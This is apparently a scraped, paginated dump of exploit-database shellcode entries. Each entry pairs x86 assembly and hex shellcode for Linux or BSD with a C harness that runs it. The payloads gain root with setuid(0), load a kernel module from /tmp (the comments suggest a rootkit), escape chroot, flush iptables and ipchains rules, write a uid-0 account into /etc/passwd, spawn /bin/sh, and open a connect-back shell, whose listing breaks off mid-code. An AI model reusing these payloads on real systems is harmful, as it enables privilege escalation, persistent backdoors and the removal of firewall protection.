{"Title": "Linux/x86 - setuid(0) + Load Kernel Module (/tmp/o.o) Shellcode (67 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://rootteam.void.ru/shellcodes/lnx_insmod.c", "View": null, "code": ["/* The shellcode sets uid == 0 and loads the kernel module from /tmp/o.o", "", "   size = 67 bytes ", "   OS\t= Linux i386", " \t\twritten by /rootteam/dev0id (rootteam.void.ru)", "\t\t\t\tdev0id@uncompiled.com ", "", "BITS\t32", "", "jmp\tshort\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\txor\tebx,ebx", "\tmov\tal,23", "\tint\t0x80", "\tmov byte [esi+12],al", "\tmov byte [esi+21],al", "\tmov long [esi+22],esi", "\tlea\t ebx,[esi+13]", "\tmov long [esi+26],ebx", "\tmov long [esi+30],eax", "\tmov \tal,0x0b", "\tmov\tebx,esi", "\tlea\tecx,[esi+22]", "\tlea\tedx,[esi+30]", "\tint\t0x80", "\t", "", "callme:", "\tcall\tmain", "\tdb '/sbin/insmod#/tmp/o.o'\t", "*/\t", "", "char shellcode[] =", "\t\"\\xeb\\x27\\x5e\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\x88\\x46\\x0c\\x88\"", "\t\"\\x46\\x15\\x89\\x76\\x16\\x8d\\x5e\\x0d\\x89\\x5e\\x1a\\x89\\x46\\x1e\\xb0\"", "\t\"\\x0b\\x89\\xf3\\x8d\\x4e\\x16\\x8d\\x56\\x1e\\xcd\\x80\\xe8\\xd4\\xff\\xff\"", "\t\"\\xff\\x2f\\x73\\x62\\x69\\x6e\\x2f\\x69\\x6e\\x73\\x6d\\x6f\\x64\\x23\\x2f\"", "\t\"\\x74\\x6d\\x70\\x2f\\x6f\\x2e\\x6f\";", "int", "main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - setuid(0) + Break chroot (../ 10x Loop) Shellcode (34 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://rootteam.void.ru/shellcodes/lnx_stuid_chroot_sc.c", "View": null, "code": ["/* The setuid(0)+chroot() shellcode. It is the one of the smallest shellcodes", "   in the !!world!!", "   it will put '../' 10 times", "   Size  34 bytes", "   OS\t Linux", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "", "BITS\t32", "main:", "\txor\tecx,ecx", "\txor\teax,eax", "\txor\tebx,ebx", "\tmov\tal,23", "\tint\t0x80", "\tpush\tecx", "\tmov\tcl,30", "main_push:", "\tpush byte 0x2e", "\tloop\tmain_push", "\tmov\tcl,30", "main_inc:", "\tdec\tcl", "\tinc byte [esp+ecx]", "\tdec\tcl", "\tloop\tmain_inc", "\tmov\tebx,esp", "\tmov\tal,61", "\tint\t0x80", "", "", "", "", "", "", "", "", "*/", "", "char shellcode[] =", "\t\"\\x31\\xc9\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\x51\\xb1\\x1e\\x6a\\x2e\"", "\t\"\\xe2\\xfc\\xb1\\x1e\\xfe\\xc9\\xfe\\x04\\x0c\\xfe\\xc9\\xe2\\xf7\\x89\\xe3\"", "\t\"\\xb0\\x3d\\xcd\\x80\";", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]},
{"Title": "BSD/x86 - setuid(0) + Break chroot (../ 10x Loop) Shellcode (34 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/stuid_chroot_sht_sc.c", "View": null, "code": ["/* The setuid(0)+chroot() shellcode. It is the one of the smallest shellcodes", "   in the !!world!!", "   it will put '../' 10 times", "   Size  34 bytes", "   OS\t *BSD", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "", "BITS\t32", "", "\txor\tecx,ecx", "\txor\teax,eax", "\tpush\teax", "\tmov\tal,0x17", "\tpush\teax", "\tint\t0x80", "\tpush\tecx", "\tmov\tcl,0x1e", "main_push:", "\tpush byte 0x2e", "\tloop\tmain_push", "\tmov\tcl,0x1e", "main_loop:", "\tdec\tcl", "\tinc byte [esp+ecx]", "\tdec\tcl", "\tloop\tmain_loop", "\tpush \tesp", "\tmov\tal,0x3d", "\tpush\teax", "\tint\t0x80", "", "*/", "char shellcode[] =", "\t\"\\x31\\xc9\\x31\\xc0\\x50\\xb0\\x17\\x50\\xcd\\x80\\x51\\xb1\\x1e\\x6a\\x2e\"", "\t\"\\xe2\\xfc\\xb1\\x1e\\xfe\\xc9\\xfe\\x04\\x0c\\xfe\\xc9\\xe2\\xf7\\x54\\xb0\"", "\t\"\\x3d\\x50\\xcd\\x80\";", "", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]},
{"Title": "OpenBSD/x86 - Load Kernel Module (/tmp/o.o) Shellcode (66 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "OpenBSD_x86", "Download": "http://rootteam.void.ru/shellcodes/mload.c", "View": null, "code": ["/* The modload shellcode", "   loads /tmp/o.o module", "\tvery usefull if you have  rootkit as kernel module in the /tmp dir", "\tand you can easily change the path directly in the code", "  ", "   Size  66 bytes", "   OS\t OpenBSD", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "", "BITS\t32", "", "jmp\tshort\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\tpush\teax", "\tpush long\t0x68732f6e", "\tpush long\t0x69622f2f", "\tmov\tebx,esp", "\tpush\teax", "\tpush word\t0x632d", "\tmov\tedi,esp", "\tpush\teax", "\tpush\tesi", "\tpush\tedi", "\tpush\tebx", "\tmov\tedi,esp", "\tpush\teax", "\tpush\tedi", "\tpush\tebx", "\tpush\teax", "\tmov\tal,0x3B", "\tint\t0x80", "callme:", "\tcall\tmain", "\tdb\t'/sbin/modload /tmp/o.o'", "*/", "", "char shellcode[] =", "\t\"\\xeb\\x25\\x59\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\"", "\t\"\\x69\\x89\\xe3\\x50\\x66\\x68\\x2d\\x63\\x89\\xe7\\x50\\x51\\x57\\x53\\x89\"", "\t\"\\xe7\\x50\\x57\\x53\\x50\\xb0\\x3b\\xcd\\x80\\xe8\\xd6\\xff\\xff\\xff\\x2f\"", "\t\"\\x73\\x62\\x69\\x6e\\x2f\\x6d\\x6f\\x64\\x6c\\x6f\\x61\\x64\\x20\"", "\t\"\\x2f\\x74\\x6d\\x70\\x2f\\x6f\\x2e\\x6f\"; // \"/tmp/o.o\" <<put your path here!", "", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]},
{"Title": "OpenBSD/x86 - setuid(0) + Load Kernel Module (/tmp/o.o) Shellcode (74 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "OpenBSD_x86", "Download": "http://rootteam.void.ru/shellcodes/setuid_mload.c", "View": null, "code": ["/* The modload shellcode", "   setuid(0)", "   loads /tmp/o.o module", "\tvery usefull if you have  rootkit as kernel module in the /tmp dir", "  ", "   Size  74 bytes", "   OS\t OpenBSD", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "BITS\t32", "", "jmp\tshort\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\tpush\teax", "\tmov \tal,0x17", "\tpush\teax", "\tint\t0x80", "\txor\teax,eax", "\tpush\teax", "\tpush long\t0x68732f6e", "\tpush long\t0x69622f2f", "\tmov\tebx,esp", "\tpush\teax", "\tpush word\t0x632d", "\tmov\tedi,esp", "\tpush\teax", "\tpush\tesi", "\tpush\tedi", "\tpush\tebx", "\tmov\tedi,esp", "\tpush\teax", "\tpush\tedi", "\tpush\tebx", "\tpush\teax", "\tmov\tal,0x3B", "\tint\t0x80", "callme:", "\tcall\tmain", "\tdb\t'/sbin/modload /tmp/o.o'", "*/", "char shellcode[] =", "\t\"\\xeb\\x2d\\x5e\\x31\\xc0\\x50\\xb0\\x17\\x50\\xcd\\x80\\x31\\xc0\\x50\\x68\"", "\t\"\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x66\\x68\\x2d\"", "\t\"\\x63\\x89\\xe7\\x50\\x56\\x57\\x53\\x89\\xe7\\x50\\x57\\x53\\x50\\xb0\\x3b\"", "\t\"\\xcd\\x80\\xe8\\xce\\xff\\xff\\xff\\x2f\\x73\\x62\\x69\\x6e\\x2f\\x6d\\x6f\"", "\t\"\\x64\\x6c\\x6f\\x61\\x64\\x20\\x2f\\x74\\x6d\\x70\\x2f\\x6f\\x2e\\x6f\";", "", "", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]}
]

const pag_7 = [{"Title": "BSD/x86 - Break chroot (../ 10x Loop) Shellcode (28 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/chroot_sht_sc.c", "View": null, "code": ["/* One of the smallest chroot shellcodes in the !!world!!", "   it will put '../' 10 times", "   Size  28 bytes", "   OS\t *BSD", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "", "BITS\t32", "", "\txor\tecx,ecx", "\txor\teax,eax", "\tpush\tecx", "\tmov\tcl,0x1e", "main_push:", "\tpush byte 0x2e", "\tloop\tmain_push", "\tmov\tcl,0x1e", "main_loop:", "\tdec\tcl", "\tinc byte [esp+ecx]", "\tdec\tcl", "\tloop\tmain_loop", "\tpush \tesp", "\tmov\tal,0x3d", "\tpush\teax", "\tint\t0x80", "", "*/", "char shellcode[] =", "\t\"\\x31\\xc9\\x31\\xc0\\x51\\xb1\\x1e\\x6a\\x2e\\xe2\\xfc\\xb1\\x1e\\xfe\\xc9\"", "\t\"\\xfe\\x04\\x0c\\xfe\\xc9\\xe2\\xf7\\x54\\xb0\\x3d\\x50\\xcd\\x80\";", "", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]},
{"Title": "BSD/x86 - Break chroot (../ 10x Loop) Shellcode (40 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/chroot_sc.c", "View": null, "code": ["/* One of the smallest chroot shellcodes", "   it will put '../' 10 times", "   Size  40 bytes", "   OS\t *BSD", "  \t\t/rootteam/dev0id\t(rootteam.void.ru)", "\t\t\tdev0id@uncompiled.com ", "", "", "BITS\t32", "", "jmp short callme", "main:", "\tpop\tesi", "\tmov\tedi,esi", "\txor\tecx,ecx", "\txor\teax,eax", "\tpush\teax", "\tmov\tcl,0x1e", "\tmov\tal,0x2e", "\trepne   stosb", "\tpop\teax", "\tstosb", "\tmov\tcl,0x1e", "main_loop:", "\tdec\tcl", "\tinc byte [esi+ecx]", "\tdec\tcl", "\tloop\tmain_loop", "\tpush \tesi", "\tmov\tal,0x3d", "\tpush\teax", "\tint\t0x80", "callme:", "\tcall\tmain", "*/", "", "char shellcode[] =", "\t\"\\xeb\\x21\\x5e\\x89\\xf7\\x31\\xc9\\x31\\xc0\\x50\\xb1\\x1e\\xb0\\x2e\\xf2\"", "\t\"\\xaa\\x58\\xaa\\xb1\\x1e\\xfe\\xc9\\xfe\\x04\\x0e\\xfe\\xc9\\xe2\\xf7\\x56\"", "\t\"\\xb0\\x3d\\x50\\xcd\\x80\\xe8\\xda\\xff\\xff\\xff\";", "", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}"]},
{"Title": "Linux/x86 - Flush IPTables Rules (/sbin/iptables -F) + exit() Shellcode (58 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://rootteam.void.ru/shellcodes/flush-iptables-exit.c", "View": null, "code": ["/* The shellcode flushs the iptables  by running /sbin/iptables -F", "   then exit()", "   greetz to zilion: man, my code is shorter!", "", "   size = 64 bytes ", "   OS\t= Linux i386", " \t\twritten by /rootteam/dev0id (rootteam.void.ru)", " ", "", "BITS\t32", "", "jmp\tshort\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\tmov byte [esi+14],al", "\tmov byte [esi+17],al", "\tmov long [esi+18],esi", "\tlea\t ebx,[esi+15]", "\tmov long [esi+22],ebx", "\tmov long [esi+26],eax", "\tmov \tal,0x0b", "\tmov\tebx,esi", "\tlea\tecx,[esi+18]", "\tlea\tedx,[esi+26]", "\tint\t0x80", "\tmov\tal,0x01", "\txor\tebx,ebx", "\tint\t0x80", "\t", "", "callme:", "\tcall\tmain", "\tdb '/sbin/iptables#-F#'", "*/", "", "", "char shellcode[] =", "\t\"\\xeb\\x27\\x5e\\x31\\xc0\\x88\\x46\\x0e\\x88\\x46\\x11\\x89\\x76\\x12\\x8d\"", "\t\"\\x5e\\x0f\\x89\\x5e\\x16\\x89\\x46\\x1a\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x12\"", "\t\"\\x8d\\x56\\x1a\\xcd\\x80\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xd4\\xff\\xff\"", "\t\"\\xff\\x2f\\x73\\x62\\x69\\x6e\\x2f\\x69\\x70\\x74\\x61\\x62\\x6c\\x65\\x73\"", "\t\"\\x23\\x2d\\x46\\x23\";", "", "\t", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - Flush IPChains Rules (/sbin/ipchains -F) + exit() Shellcode (64 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://rootteam.void.ru/shellcodes/flush-ipchains-exit.c", "View": null, "code": ["/* The shellcode flushs the ipchains table by running /sbin/ipchains -F", "   then exit()", "   greetz to zilion: man, my code is shorter!", "", "   size = 64 bytes ", "   OS\t= Linux i386", " \t\twritten by /rootteam/dev0id (rootteam.void.ru)", " ", "", "BITS\t32", "", "jmp\tshort\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\tmov byte [esi+14],al", "\tmov byte [esi+17],al", "\tmov long [esi+18],esi", "\tlea\t ebx,[esi+15]", "\tmov long [esi+22],ebx", "\tmov long [esi+26],eax", "\tmov \tal,0x0b", "\tmov\tebx,esi", "\tlea\tecx,[esi+18]", "\tlea\tedx,[esi+26]", "\tint\t0x80", "\tmov\tal,0x01", "\txor\tebx,ebx", "\tint\t0x80", "\t", "", "callme:", "\tcall\tmain", "\tdb '/sbin/ipchains#-F#'", "*/", "", "", "char shellcode[] =", "\t\"\\xeb\\x27\\x5e\\x31\\xc0\\x88\\x46\\x0e\\x88\\x46\\x11\\x89\\x76\\x12\\x8d\"", "\t\"\\x5e\\x0f\\x89\\x5e\\x16\\x89\\x46\\x1a\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x12\"", "\t\"\\x8d\\x56\\x1a\\xcd\\x80\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xd4\\xff\\xff\"", "\t\"\\xff\\x2f\\x73\\x62\\x69\\x6e\\x2f\\x69\\x70\\x63\\x68\\x61\\x69\\x6e\\x73\"", "\t\"\\x23\\x2d\\x46\\x23\";", "", "\t", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - Flush IPChains Rules (/sbin/ipchains -F) Shellcode (58 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://rootteam.void.ru/shellcodes/flush-ipchains-noexit.c", "View": null, "code": ["/* The shellcode flushs the ipchains table by running /sbin/ipchains -F", "   no exit()", "   greetz to zilion: man, my code is shorter!", "", "   size = 58 bytes ", "   OS\t= Linux i386", " \t\twritten by /rootteam/dev0id (rootteam.void.ru)", " ", "", "BITS\t32", "", "jmp\tshort\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\tmov byte [esi+14],al", "\tmov byte [esi+17],al", "\tmov long [esi+18],esi", "\tlea\t ebx,[esi+15]", "\tmov long [esi+22],ebx", "\tmov long [esi+26],eax", "\tmov \tal,0x0b", "\tmov\tebx,esi", "\tlea\tecx,[esi+18]", "\tlea\tedx,[esi+26]", "\tint\t0x80", "\t", "", "callme:", "\tcall\tmain", "\tdb '/sbin/ipchains#-F#'", ";*/", "", "char shellcode[] =", "\t\"\\xeb\\x21\\x5e\\x31\\xc0\\x88\\x46\\x0e\\x88\\x46\\x11\\x89\\x76\\x12\\x8d\"", "\t\"\\x5e\\x0f\\x89\\x5e\\x16\\x89\\x46\\x1a\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x12\"", "\t\"\\x8d\\x56\\x1a\\xcd\\x80\\xe8\\xda\\xff\\xff\\xff\\x2f\\x73\\x62\\x69\\x6e\"", "\t\"\\x2f\\x69\\x70\\x63\\x68\\x61\\x69\\x6e\\x73\\x23\\x2d\\x46\\x23\";", "", "\t", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "BSD/x86 - symlink /bin/sh sh Shellcode (39 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/long_sc.c", "View": null, "code": ["/*The shellcode calls the symlink() and makes the ", " link to the /bin/sh in the current dir.", " size = 39 bytes", " OS   = *BSD", " \twritten by /rootteam/dev0id (rootteam.void.ru)", "\t", "\t", "BITS 32", "jmp short\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\tmov byte [esi+7],al", "\tmov byte [esi+10],al", "\tlea\tebx,[esi+8]", "\tpush\tebx", "\tlea\tebx,[esi]", "\tpush\tebx", "\tmov\tal,57", "\tpush\teax", "\tint\t0x80", "\t", "callme:", "\tcall\tmain", "\tdb\t'/bin/sh#sh#'", "*/", "", "char shellcode[] =", "\t\"\\xeb\\x15\\x5e\\x31\\xc0\\x88\\x46\\x07\\x88\\x46\\x0a\\x8d\\x5e\\x08\\x53\"", "\t\"\\x8d\\x1e\\x53\\xb0\\x39\\x50\\xcd\\x80\\xe8\\xe6\\xff\\xff\\xff\\x2f\\x62\"", "\t\"\\x69\\x6e\\x2f\\x73\\x68\\x23\\x73\\x68\\x23\";", "", "", " ", "", " ", "", "", "int", "main (void)", "{", "\tvoid (*code)(void);", "\tcode=(void(*)())shellcode;", "\t(void)code();", "\treturn 0;", "\t\t", "}"]},
{"Title": "Linux/x86 - symlink /bin/sh sh Shellcode (36 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://rootteam.void.ru/shellcodes/sl.c", "View": null, "code": ["/*The shellcode calls the symlink() and makes the ", " link to the /bin/sh in the current dir.", " size = 36 bytes", " OS   = Linux i386", " \twritten by /rootteam/dev0id (rootteam.void.ru)", " ", "", " ", "  BITS 32", "  ", "jmp short\tcallit", "", "doit:\t", "", "pop\t\tesi", "xor\t\teax,eax", "mov byte\t[esi+7],al", "mov byte\t[esi+10],al", "mov byte\tal,83       ", "lea\t\tebx,[esi]       ", "lea             ecx,[esi+8]", "int\t\t0x80", "", "", "callit:", "call\t\tdoit", "", "db\t\t'/bin/sh#sh#'", "*/", "", "char shellcode[]=", "\"\\xEB\\x12\"", "\"\\x5E\"     ", "\"\\x31\\xC0\"", "\"\\x88\\x46\\x07\"  ", "\"\\x88\\x46\\x0A\" ", "\"\\xB0\\x53\"    ", "\"\\x8D\\x1E\\x8D\\x4E\"", "\"\\x08\\xCD\"       ", "\"\\x80\\xE8\\xE9\"  ", "\"\\xFF\"         ", "\"\\xFF\"        ", "\"\\xFF\\x2F\"   ", "\"\\x62\\x69\\x6E\"", "\"\\x2F\"       ", "\"\\x73\\x68\"  ", "\"\\x23\\x73\\x68\"", "\"\\x23\";      ", "", "", "int", "main (void)", "{", "\tvoid (*code)(void);", "\tcode=(void(*)())shellcode;", "\t(void)code();", "\treturn 0;", "\t\t", "}"]},
{"Title": "BSD/x86 - Write to /etc/passwd with uid(0) + gid(0) Shellcode (74 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/pass74.s", "View": null, "code": ["/*************************************************************", "writes the line for user in /etc/passwd with uid&gid == 0 ", "OS: *BSD", "length: 74", "\twritten by dev0id dev0id@mail.ru (rootteam.void.ru)", "\t  \t\t  #rus-sec /Efnet.org", "greetz:", "\tmig", "\tnerf", "\t", "*************************************************************", "BITS 32", "main:", "\txor\teax,eax", "\tpush\teax", "\tpush byte 0x64", "\tpush word 0x7773", "\tpush long 0x7361702f", "\tpush long 0x6374652f", "\tmov\tebx,esp", "\tmov\tal,0x0a", "\tpush\teax", "\tpush\tebx", "\tmov\tal,5", "\tpush\teax", "\tint\t0x80", "\t", "", "\tmov\tedx,eax", "", "\tpush long 0x0a206873", "\tpush long 0x2f6e6962", "\tpush long 0x2f3a2f3a", "\tpush long 0x313a303a", "\tpush long 0x303a3a31", "\tmov ebx,esp", "\tmov\tal,20", "\tpush\teax", "\tpush\tebx", "\tpush\tedx", "\tmov\tal,4", "\tpush\teax", "\tint\t0x80", "", "\tmov\tal,1", "\tpush\teax", "\tint\t0x80", "", "*************************************************************", "", "", "", "char shellcode[] =", "\t\"\\x31\\xc0\\x50\\x6a\\x64\\x66\\x68\\x73\\x77\\x68\\x2f\\x70\\x61\\x73\\x68\"", "\t\"\\x2f\\x65\\x74\\x63\\x89\\xe3\\xb0\\x0a\\x50\\x53\\xb0\\x05\\x50\\xcd\\x80\"", "\t\"\\x89\\xc2\\x68\\x73\\x68\\x20\\x0a\\x68\\x62\\x69\\x6e\\x2f\\x68\\x3a\\x2f\"", "\t\"\\x3a\\x2f\\x68\\x3a\\x30\\x3a\\x31\\x68\\x31\\x3a\\x3a\\x30\\x89\\xe3\\xb0\"", "\t\"\\x14\\x50\\x53\\x52\\xb0\\x04\\x50\\xcd\\x80\\xb0\\x01\\x50\\xcd\\x80\";"]},
{"Title": "Linux/x86 - Write to /etc/passwd with uid(0) + gid(0) Shellcode (74 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://rootteam.void.ru/shellcodes/pass.s", "View": null, "code": ["/*************************************************************", "This shellcode writes to /etc/passwd the string for the user ", "with uid&gid == 0;", "\twritten by dev0id dev0id@mail.ru (rootteam.void.ru)", "\t  \t\t  #rus-sec /Efnet.org", "greetz:", "\tnerf", "\tw00w00", "*************************************************************", "", "BITS 32", "jmp short path", "main:", "\tpop\tesi", "\txor\teax,eax", "\tpush\teax", "\tmov byte [esi+11],al", "\tmov\tal,0x0a", "\tpush\teax", "\tpush\tesi", "\tmov\tal,5", "\tpush\teax", "\tint\t0x80", "\t", "", "\tmov\tedx,eax", "", "\tpush long 0x0a206873", "\tpush long 0x2f6e6962", "\tpush long 0x2f3a2f3a", "\tpush long 0x313a303a", "\tpush long 0x303a3a31", "\tmov ebx,esp", "\tmov\tal,20", "\tpush\teax", "\tpush\tebx", "\tpush\tedx", "\tmov\tal,4", "\tpush\teax", "\tint\t0x80", "", "\tmov\tal,1", "\tpush\teax", "\tint\t0x80", "path:", "\tcall main", "\tdb\t\"/etc/passwd#\"", "", "********************************************************************/", "char shellcode[] =", "\t\"\\xeb\\x3c\\x5e\\x31\\xc0\\x50\\x88\\x46\\x0b\\xb0\\x0a\\x50\\x56\\xb0\\x05\"", "\t\"\\x50\\xcd\\x80\\x89\\xc2\\x68\\x73\\x68\\x20\\x0a\\x68\\x62\\x69\\x6e\\x2f\"", "\t\"\\x68\\x3a\\x2f\\x3a\\x2f\\x68\\x3a\\x30\\x3a\\x31\\x68\\x31\\x3a\\x3a\\x30\"", "\t\"\\x89\\xe3\\xb0\\x14\\x50\\x53\\x52\\xb0\\x04\\x50\\xcd\\x80\\xb0\\x01\\x50\"", "\t\"\\xcd\\x80\\xe8\\xbf\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\"", "\t\"\\x73\\x77\\x64\\x23\";"]},
{"Title": "BSD/x86 - execve(/bin/sh) + seteuid(0) Shellcode (31 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/exec_binsh_seuid0.c", "View": null, "code": ["/*", "simply\texecve_binsh+seteuid(0) shellcode in 31 bytes", "written on nasm - my first nasm exp.", "greetz2:", "\tmig\t#darknet /EFnet.org", "\tnerf\t#nerf\t /EFnet.org", "\t\t\t\tdev0id #rus-sec /EFnet.org (rootteam.void.ru)", "*/", "", "char shellcode[] =", "\t\"\\x31\\xc0\\x50\\xb0\\xb7\\xcd\\x80\\x50\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"", "\t\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x53\\xb0\\x3b\\x50\\xcd\"", "\t\"\\x80\";", "void", "main()", "{", "\tint *ret;", "\tret=(int*)&ret+2;", "\t(*ret)=(int)shellcode;", "}", "", "/****************************************", "--------------start---------------------", "BITS 32", "", "main:", "\txor\t\teax,eax", "\tpush\t\teax", "\tmov\t\tal,183", "\tint\t\t0x80", "\tpush\t\teax", "\txor\t\teax,eax", "\tpush\t\teax", "\tpush long\t0x68732f2f", "\tpush long\t0x6e69622f", "\tmov\t\tebx,esp", "\tpush\t\teax", "\tpush\t\tesp", "\tpush\t\tebx", "\tmov\t\tal,59", "\tpush\t\teax", "\tint\t\t0x80", "", "\t;mov\t\tal,1    need exit? I do not!", "\t;push\t\teax", "\t;int\t\t0x80", "---------------end----------------------", "compilation:", "\t%nasm code.s -o code", "****************************************/"]},
{"Title": "BSD/x86 - execve(/bin/sh) Shellcode (28 bytes)", "Author": "dev0id", "Published": ": 2009-01-01", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/exec_bin.c", "View": null, "code": ["/*", "simply\texecve_binsh shellcode in 28 bytes", "written on nasm - my first nasm exp.", "greetz2:", "\tmig #darknet /EFnet.org", "\t\t\t\tdev0id #rus-sec /EFnet.org (rootteam.void.ru)", "*/", "char shellcode[] =", "\t\"\\xeb\\x0e\\x5e\\x31\\xc0\\x88\\x46\\x07\\x50\\x50\\x56\\xb0\\x3b\\x50\\xcd\"", "\t\"\\x80\\xe8\\xed\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\";", "", "void", "main()", "{", "\tint *ret;", "\tret=(int*)&ret+2;", "\t(*ret)=(int)shellcode;", "}", "", "/****************************************", "nasm code is:\t\t\t        ", "---------------start--------------------", "BITS\t32\t\t\t       ", "\t\t\t\t", "jmp short\tpath\t", "main:\t\t", "\tpop\tesi", "\txor\teax,eax", "\tmov byte [esi+7],al", "\tpush\teax", "\tpush\teax", "\tpush\tesi", "\tmov\tal,59", "\tpush\teax", "\tint\t0x80", "", "\t;mov\tal,1   need ? I do not!", "\t;push\teax", "\t;int\t0x80", "path:", "\tcall\tmain", "\tdb\t'/bin/sh'", "---------------end----------------------", "compilation:", "\t%nasm code.s -o code", "****************************************/"]},
{"Title": "Linux/x86 - Bind (3879/TCP) Shell (/bin/sh) Shellcode (113 bytes)", "Author": "lamagra", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-366.php", "View": null, "code": ["/*", "Connecting shellcode written by lamagra <lamagra@digibel.org>", "http://lamagra.seKure.de", "", "May 2000", "", ".file\t\"connect\"", ".version\t\"01.01\"", ".text", "\t.align 4", "_start:", "\t#socket(AF_INET,SOCK_STREAM,IPPROTO_IP);", "\tmovl %esp,%ebp", "\txorl %edx,%edx", "\tmovb $102,%edx", "\tmovl %edx,%eax\t\t# 102 = socketcall", "\txorl %ecx,%ecx", "\tmovl %ecx,%ebx", "\tincl %ebx\t \t\t# socket()", "\tmovl %ebx, -8(%ebp)\t# 1 = SOCK_STREAM", "\tincl %ebx", "\tmovl %ebx, -12(%ebp)\t# 2 = AF_INET", "\tdecl %ebx\t\t\t# 1 = SYS_socket", "\tmovl %ecx, -4(%ebp)\t# 0 = IPPROTO_IP ", "\tleal -12(%ebp),%ecx\t# put args in correct place", "\tint  $0x80\t\t\t# switch to kernel-mode", "\txorl %ecx,%ecx", "\tmovl %eax,-12(%ebp)\t# save the fd", "", "\t# connect(fd,(struct sockaddr *)&struct,16);", "\tincl %ebx", "\tmovw %ebx,-20(%ebp)\t# 2 = PF_INET", "\tmovw $9999,-18(%ebp)\t# 9999 = htons(3879);", "\tmovl $0x100007f,-16(%ebp) # htonl(IP) ", "\tleal -20(%ebp),%eax\t# struct sockaddr", "\tmovl %eax,-8(%ebp)\t# load the struct", "\tmovb $16,-4(%ebp)\t\t# 16 = sizeof(sockaddr)", "\tmovl %edx,%eax\t\t# 102 = socketcall", "\tincl %ebx\t\t\t# 3 = SYS_connect", "\tleal -12(%ebp),%ecx\t# put args in place", "\tint  $0x80\t\t\t# call socketcall()", "", "\t# dup2(fd,0-1-2)", "\txorl %ecx,%ecx", "\tmovb $63,%eax\t\t# 63 = dup2()", "\tint  $0x80", "        incl %ecx", "        cmpl $3,%ecx", "        jne  -0xa", "", "\t# arg[0] = \"/bin/sh\"", "\t# arg[1] = 0x0", "\t# execve(arg[0],arg);", "\tjmp  0x18", "\tpopl %esi", 